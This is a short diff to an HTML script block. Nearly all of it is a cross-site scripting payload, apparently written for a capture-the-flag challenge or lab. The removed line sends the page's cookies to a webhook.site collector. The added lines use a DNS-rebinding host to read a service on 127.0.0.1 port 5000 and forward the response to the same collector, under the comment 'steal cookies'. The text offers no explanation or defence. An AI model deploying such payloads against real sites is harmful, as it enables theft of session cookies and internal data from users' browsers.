@@ -1,3 +1,8 @@
 <script>
-  fetch('https://webhook.site/3ddce979-21b6-4617-9dbf-fdcc37b0527c/' + encodeURIComponent(document.cookie), {mode:'no-cors'});
+  // After DNS rebinds to 127.0.0.1, steal cookies
+  fetch("http://7f000001.c0a80001.rbndr.us:5000/")
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://webhook.site/3ddce979-21b6-4617-9dbf-fdcc37b0527c/?cookie=" + encodeURIComponent(data));
+    });
 </script>
